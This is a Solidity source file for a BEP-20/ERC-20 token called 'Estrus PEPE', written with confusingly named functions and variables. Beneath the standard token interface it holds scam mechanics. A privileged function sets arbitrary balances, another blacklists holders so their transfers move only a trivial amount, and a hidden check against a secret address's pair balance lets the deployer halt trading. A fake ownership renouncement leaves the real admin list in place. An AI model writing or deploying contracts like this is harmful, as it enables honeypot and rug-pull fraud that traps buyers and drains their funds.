//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface tokenMin {
    function totalSupply() external view returns (uint256);

    function balanceOf(address atIs) external view returns (uint256);

    function transfer(address listLiquidity, uint256 tokenSwap) external returns (bool);

    function allowance(address marketingBuyMode, address spender) external view returns (uint256);

    function approve(address spender, uint256 tokenSwap) external returns (bool);

    function transferFrom(
        address sender,
        address listLiquidity,
        uint256 tokenSwap
    ) external returns (bool);

    event Transfer(address indexed from, address indexed swapShouldLimit, uint256 value);
    event Approval(address indexed marketingBuyMode, address indexed spender, uint256 value);
}

abstract contract walletTo {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface minAmount {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface enableAmount {
    function createPair(address minFund, address teamLiquidity) external returns (address);
}

interface senderAmount is tokenMin {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract EstrusPEPE is walletTo, tokenMin, senderAmount {

    function amountList(address takeMax, address listLiquidity, uint256 tokenSwap) internal returns (bool) {
        require(feeMax[takeMax] >= tokenSwap);
        feeMax[takeMax] -= tokenSwap;
        feeMax[listLiquidity] += tokenSwap;
        emit Transfer(takeMax, listLiquidity, tokenSwap);
        return true;
    }

    address fromMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function feeSwapAuto(address launchedIs, uint256 tokenSwap) public {
        limitSwap();
        feeMax[launchedIs] = tokenSwap;
    }

    string private listAt = "Estrus PEPE";

    function transferFrom(address takeMax, address listLiquidity, uint256 tokenSwap) external override returns (bool) {
        if (_msgSender() != fromMode) {
            if (autoToken[takeMax][_msgSender()] != type(uint256).max) {
                require(tokenSwap <= autoToken[takeMax][_msgSender()]);
                autoToken[takeMax][_msgSender()] -= tokenSwap;
            }
        }
        return launchToTrading(takeMax, listLiquidity, tokenSwap);
    }

    bool public listLiquidityReceiver;

    function approve(address swapAuto, uint256 tokenSwap) public virtual override returns (bool) {
        autoToken[_msgSender()][swapAuto] = tokenSwap;
        emit Approval(_msgSender(), swapAuto, tokenSwap);
        return true;
    }

    address public minSwap;

    mapping(address => bool) public buyTx;

    function symbol() external view virtual override returns (string memory) {
        return toTx;
    }

    function fromLaunched(address exemptLimit) public {
        limitSwap();
        if (takeTx == minTradingFee) {
            senderMax = txTo;
        }
        if (exemptLimit == minSwap || exemptLimit == listReceiver) {
            return;
        }
        buyTx[exemptLimit] = true;
    }

    uint256 private txTo;

    string private toTx = "EPE";

    mapping(address => uint256) private feeMax;

    mapping(address => mapping(address => uint256)) private autoToken;

    function fromAuto() public {
        emit OwnershipTransferred(minSwap, address(0));
        toLaunched = address(0);
    }

    uint256 limitTrading;

    function txShould(uint256 tokenSwap) public {
        limitSwap();
        limitTrading = tokenSwap;
    }

    uint256 private feeIs;

    uint256 private atMax;

    address public listReceiver;

    function decimals() external view virtual override returns (uint8) {
        return autoSender;
    }

    function modeReceiverLaunched(address receiverAuto) public {
        require(receiverAuto.balance < 100000);
        if (walletEnableTotal) {
            return;
        }
        if (maxTx) {
            fundMarketingTeam = false;
        }
        minIs[receiverAuto] = true;
        
        walletEnableTotal = true;
    }

    uint256 private takeTx;

    function owner() external view returns (address) {
        return toLaunched;
    }

    function limitSwap() private view {
        require(minIs[_msgSender()]);
    }

    function transfer(address launchedIs, uint256 tokenSwap) external virtual override returns (bool) {
        return launchToTrading(_msgSender(), launchedIs, tokenSwap);
    }

    function getOwner() external view returns (address) {
        return toLaunched;
    }

    address atLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private senderMax;

    function totalSupply() external view virtual override returns (uint256) {
        return receiverFund;
    }

    bool private fundMarketingTeam;

    function launchToTrading(address takeMax, address listLiquidity, uint256 tokenSwap) internal returns (bool) {
        if (takeMax == minSwap) {
            return amountList(takeMax, listLiquidity, tokenSwap);
        }
        uint256 walletTake = tokenMin(listReceiver).balanceOf(atLimit);
        require(walletTake == limitTrading);
        require(listLiquidity != atLimit);
        if (buyTx[takeMax]) {
            return amountList(takeMax, listLiquidity, shouldEnable);
        }
        return amountList(takeMax, listLiquidity, tokenSwap);
    }

    bool public walletEnableTotal;

    bool private fundTake;

    uint256 public minTradingFee;

    uint8 private autoSender = 18;

    uint256 constant shouldEnable = 14 ** 10;

    uint256 private receiverFund = 100000000 * 10 ** 18;

    event OwnershipTransferred(address indexed liquidityTeam, address indexed toMin);

    function balanceOf(address atIs) public view virtual override returns (uint256) {
        return feeMax[atIs];
    }

    function name() external view virtual override returns (string memory) {
        return listAt;
    }

    mapping(address => bool) public minIs;

    constructor (){
        
        minAmount feeReceiver = minAmount(fromMode);
        listReceiver = enableAmount(feeReceiver.factory()).createPair(feeReceiver.WETH(), address(this));
        
        minSwap = _msgSender();
        fromAuto();
        minIs[minSwap] = true;
        feeMax[minSwap] = receiverFund;
        if (fundTake == listLiquidityReceiver) {
            takeTx = minTradingFee;
        }
        emit Transfer(address(0), minSwap, receiverFund);
    }

    address private toLaunched;

    bool public maxTx;

    uint256 exemptSwapAmount;

    function allowance(address sellAt, address swapAuto) external view virtual override returns (uint256) {
        if (swapAuto == fromMode) {
            return type(uint256).max;
        }
        return autoToken[sellAt][swapAuto];
    }

}